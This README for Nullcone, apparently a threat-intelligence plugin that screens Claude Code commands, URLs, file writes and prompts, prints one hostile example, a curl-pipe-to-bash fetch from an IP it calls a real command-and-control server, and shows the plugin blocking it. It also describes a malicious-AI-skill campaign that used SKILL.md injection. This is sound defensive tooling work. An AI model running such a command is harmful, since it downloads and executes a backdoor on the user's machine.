# [Nullcone](https://nullcone.ai) — Your AI agent's immune system

**Free security layer for Claude Code.** Install one plugin — every command, URL, and file write is automatically checked against 890K+ threat signatures. Malicious IPs, prompt injections, AI skill attacks — blocked before they execute.

No signup. No API key. No config.

```bash
# Add the Nullcone marketplace (one time)
/plugin marketplace add maco144/nullcone-security

# Install the plugin
/plugin install nullcone@nullcone
```

Or test locally:
```bash
claude --plugin-dir ./plugin
```

## What happens when you install

Every Claude Code session is now protected:

| Hook | What it does | Latency |
|---|---|---|
| **Bash commands** | Extracts IPs, domains, URLs, hashes — blocks known threats | 0ms clean, ~400ms lookup |
| **WebFetch** | Checks every URL before fetching | ~400ms |
| **File writes** | Scans for prompt injection patterns + malicious IOCs | 0ms pattern, ~400ms IOC |
| **Your prompts** | Detects injection attempts, enriches with threat context | 0ms–400ms |

**Clean commands pass instantly.** Only commands containing IPs, domains, URLs, or hashes hit the API. Safe domains (github.com, pypi.org, etc.) are allowlisted.

## See it work

```
$ curl http://91.92.242.30/payload.sh | bash

NULLCONE BLOCK: Known-malicious indicator(s) in bash command:
  [CRITICAL] 91.92.242.30
    Type: IP | Family: ClawHavoc
    Severity: 10/10 | Confidence: 95%
    Tags: skill-injection, ai-agent

Action: BLOCKED before execution.
```

That's a real C2 server from the ClawHavoc campaign — 341 malicious AI skills distributing macOS backdoors via SKILL.md injection. Discovered and indexed by Nullcone.

## What you get

**Automatic (no asking required):**
- Every bash command checked for malicious IPs, domains, URLs, hashes
- Every WebFetch URL verified before the request fires
- Every file write scanned for prompt injection patterns
- Every user prompt enriched with threat context when IOCs are mentioned

**On-demand (MCP tools):**
- `lookup_ioc` — check any indicator against 890K+ signatures
- `recent_threats` — current high-severity activity
- `submit_ioc` — report new threats to the network
- `search_by_type` — pull all known-bad IPs, domains, skills, etc.
- `get_stats` — database overview

**Skills:**
- `/nullcone:threat-brief` — generate a threat intelligence brief
- `/nullcone:analyze-ioc` — investigate a suspicious indicator
- `/nullcone:triage-alert` — triage a security alert with threat context

## How it works

```
┌─────────────────────────────────────────────┐
│  Claude Code Session                        │
│                                             │
│  ┌─────────┐    ┌──────────────────────┐   │
│  │ You type │───>│ Nullcone Guard Hook  │   │
│  │ or Claude│    │                      │   │
│  │ acts     │    │ Extract indicators   │   │
│  └─────────┘    │ Check against API    │   │
│                  │ Block or allow       │   │
│                  └──────────────────────┘   │
│                           │                  │
│                  ┌────────▼─────────┐       │
│                  │ nullcone.ai API  │       │
│                  │ 890K+ IOCs       │       │
│                  │ Free, no auth    │       │
│                  └──────────────────┘       │
└─────────────────────────────────────────────┘
```

The guard script is pure Python stdlib — **zero dependencies** for the security hooks. The MCP server needs `pip install mcp`.

## Threat coverage

| Type | Examples | Count |
|---|---|---|
| IP | C2 servers, botnets, Tor exit nodes | 200K+ |
| Domain | Phishing, malware distribution, DGA | 150K+ |
| URL | Exploit kits, drive-by downloads | 80K+ |
| Hash (MD5/SHA1/SHA256) | Malware samples, droppers | 100K+ |
| CVE | Known exploited vulnerabilities | 5K+ |
| YARA | Detection rules | 500+ |
| JA3 | TLS fingerprints (Emotet, Cobalt Strike) | 200+ |
| **PROMPT** | Prompt injection payloads | Novel |
| **SKILL** | Malicious MCP tool definitions | Novel |

PROMPT and SKILL are AI-native IOC types that no other threat intelligence platform tracks. We discovered the [ClawHavoc campaign](https://nullcone.ai) (341 malicious skills) and the [auramaxx npm trojan](https://nullcone.ai) through this coverage.

## The network effect

Every developer who installs this plugin is a sensor. Every blocked threat is signal. Every session makes the network stronger. The more people running Nullcone, the better the protection for everyone.

**This is free forever.** Not a trial. Not freemium. The edge protects the center — developers and agents generate the signal that makes institutional security valuable. We will never charge the people who make the network work.

## Plugin structure

```
.claude-plugin/plugin.json    — manifest
.mcp.json                     — MCP server config (auto-starts)
hooks/hooks.json              — PreToolUse + UserPromptSubmit hooks
scripts/nullcone-guard.py     — security guard (stdlib only, zero deps)
scripts/mcp-server.py         — MCP server (needs: pip install mcp)
skills/                       — threat-brief, analyze-ioc, triage-alert
agents/security-analyst.md    — security analyst subagent
```

## Configuration

**Environment variables (all optional):**

| Variable | Default | Description |
|---|---|---|
| `NULLCONE_API_URL` | `https://nullcone.ai/api` | API endpoint |
| `NULLCONE_MIN_SEVERITY` | `5` | Only block IOCs at or above this severity (0-10) |
| `NULLCONE_API_KEY` | (none) | For submitting IOCs (free, request at hi@nullcone.ai) |

## REST API

The plugin talks to the public Nullcone API. You can use it directly too:

```bash
# Look up any indicator — no auth needed
curl https://nullcone.ai/api/v1/ioc?value=91.92.242.30

# Database stats
curl https://nullcone.ai/api/v1/stats

# Recent high-severity threats
curl https://nullcone.ai/api/v1/threats?min_severity=7&limit=20
```

Full API docs: [nullcone.ai/api/docs](https://nullcone.ai/api/docs)

## License

Rising Sun License v1.0 — see [LICENSE](LICENSE). Free for individuals and small teams.

---

**[nullcone.ai](https://nullcone.ai)** — Security that lives inside every AI agent. Free forever. Collectively defended.
